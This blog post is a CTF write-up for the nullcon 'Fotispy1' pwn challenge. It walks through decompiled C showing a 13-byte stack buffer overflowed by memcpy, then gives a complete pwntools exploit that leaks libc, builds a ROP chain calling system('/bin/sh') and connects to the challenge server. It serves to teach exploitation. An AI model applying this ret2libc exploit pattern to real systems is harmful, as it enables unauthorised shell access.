---
date: 2025-09-02 17:03:00
layout: post
title: nullconctf write up
subtitle: trying Capture The Flag in the middle of the night
description: The challenge is fun :o
image: https://images.alphacoders.com/134/1343999.png
optimized_image: https://images.alphacoders.com/134/1343999.png
category: ctf
tags:
  - pwn
  - bof
  - foren
  - crypto
author: --
---

At night I was bored and tried CTF.

# Fotispy1
## Description
> Spotify with a GUI? A true hacker only needs the terminal.

## Initial Analysis
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/nullconctf/1.png)
In this challenge, we can see that there is no canary and no pie, making it easier for us to exploit it.

## Code Analysis
### func to add song
```c
int sub_401690()
{
  __int64 v0; // rax
  _QWORD *v2; // [rsp+8h] [rbp-38h]
  _QWORD *v3; // [rsp+10h] [rbp-30h]
  int v4; // [rsp+1Ch] [rbp-24h]
  int v5; // [rsp+20h] [rbp-20h]
  int v6; // [rsp+24h] [rbp-1Ch]
  void *v7; // [rsp+28h] [rbp-18h]
  void *v8; // [rsp+30h] [rbp-10h]
  const char *v9; // [rsp+38h] [rbp-8h]

  if ( byte_404050 == -1 )
  {
    LODWORD(v0) = puts("[-] No user has logged in yet.");
  }
  else
  {
    v9 = (const char *)calloc(0x100uLL, 1uLL);
    v8 = calloc(0x100uLL, 1uLL);
    v7 = calloc(0x100uLL, 1uLL);
    printf("[DEBUG] %p\n", &printf);
    printf("[~] Please enter a song title: ");
    v6 = sub_401207(v9, 256LL);
    printf("[~] Please enter a who %s is from: ", v9);
    v5 = sub_401207(v7, 256LL);
    printf("[~] Please enter which album %s is on: ", v9);
    v4 = sub_401207(v8, 256LL);
    v3 = calloc(0x30uLL, 1uLL);
    v3[4] = v8;
    *((_DWORD *)v3 + 10) = v4;
    *v3 = v9;
    *((_DWORD *)v3 + 2) = v6;
    v3[2] = v7;
    *((_DWORD *)v3 + 6) = v5;
    v2 = calloc(0x10uLL, 1uLL);
    v2[1] = v3;
    *v2 = *(_QWORD *)(qword_4040A0[(unsigned __int8)byte_404050] + 16LL);
    v0 = qword_4040A0[(unsigned __int8)byte_404050];
    *(_QWORD *)(v0 + 16) = v2;
  }
  return v0;
}
```
### func to view song
```c
int sub_40185D()
{
  __int64 *v0; // rax
  char dest[13]; // [rsp+Bh] [rbp-15h] BYREF
  __int64 *v3; // [rsp+18h] [rbp-8h]

  if ( byte_404050 == -1 )
  {
    LODWORD(v0) = puts("[-] No user has logged in yet.");
  }
  else
  {
    v3 = *(__int64 **)(qword_4040A0[(unsigned __int8)byte_404050] + 16LL);
    memset(dest, 0, sizeof(dest));
    LODWORD(v0) = puts("[~] Your favorites:");
    while ( v3 )
    {
      memcpy(dest, *(const void **)v3[1], *(unsigned int *)(v3[1] + 8));
      printf("    - Song: %s", dest);
      memcpy(dest, *(const void **)(v3[1] + 16), *(unsigned int *)(v3[1] + 24));
      printf(" - %s", dest);
      memcpy(dest, *(const void **)(v3[1] + 32), *(unsigned int *)(v3[1] + 40));
      printf(" - %s\n", dest);
      v0 = (__int64 *)*v3;
      v3 = (__int64 *)*v3;
    }
  }
  return (int)v0;
}
```
in function add song we can add a buffer up to 256, and in function view song there's a memcpy
```c
memcpy(dest, *(const void **)v3[1], *(unsigned int *)(v3[1] + 8));
```
what does that mean ? var dest The dest variable is only 13 bytes in size, while memcpy can add more than 256 buffers, causing a buffer overflow.

## solve.py
```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF(args.EXE or 'fotispy1')
context.terminal = ['wt.exe','wsl.exe']
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('52.59.124.14', 5191)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

def m(i): p.sendlineafter(b'[E]: ', str(i).encode())

p = start()

DEST_LEN = 13
OFF_V3   = 13      # [rbp-8]
OFF_RBP  = 21      # saved RBP
OFF_RIP  = 29      # saved RIP

QWORD_4040A0 = 0x4040A0
safe_v3 = p64(QWORD_4040A0 + 8*5)   # points to a zero qword; *v3==0 ends loop cleanly
print(hex(QWORD_4040A0 + 8*5))

# Register and login
m(0); p.sendlineafter(b'username: ', b'u'); p.sendlineafter(b'password: ', b'p')
m(1); p.sendlineafter(b'username: ', b'u'); p.sendlineafter(b'password: ', b'p')

# Add song (album overflows)
m(2)
p.recvuntil(b'[DEBUG] ')
leak = int(p.recvline().strip(), 16)
log.info(f'printf& leak: {hex(leak)}')
libc.address = leak - libc.sym.printf
log.info(f'libc leak: {hex(libc.address)}')

rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh\00')))

pad_to_v3  = b'A'*OFF_V3
after_v3   = OFF_RBP - OFF_V3 - 8      # bytes between v3 (8 bytes) and saved RBP
after_rbp  = OFF_RIP - OFF_RBP - 8     # bytes between saved RBP (8 bytes) and saved RIP

payload = pad_to_v3
payload += safe_v3                     # overwrite v3 ([rbp-8])
payload += b'B'*after_v3
payload += b'C'*8                      # saved RBP (dummy)
payload += b'D'*after_rbp
# payload += p64(0x000000000040101a)
payload += rop.chain()

p.sendlineafter(b'title: ', b'a')
p.sendlineafter(b'is from: ', b'a')
p.sendlineafter(b'is on: ', payload)

# Trigger the overflow and return
m(3)
p.interactive()
```
and we got the flag
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/nullconctf/2.png)
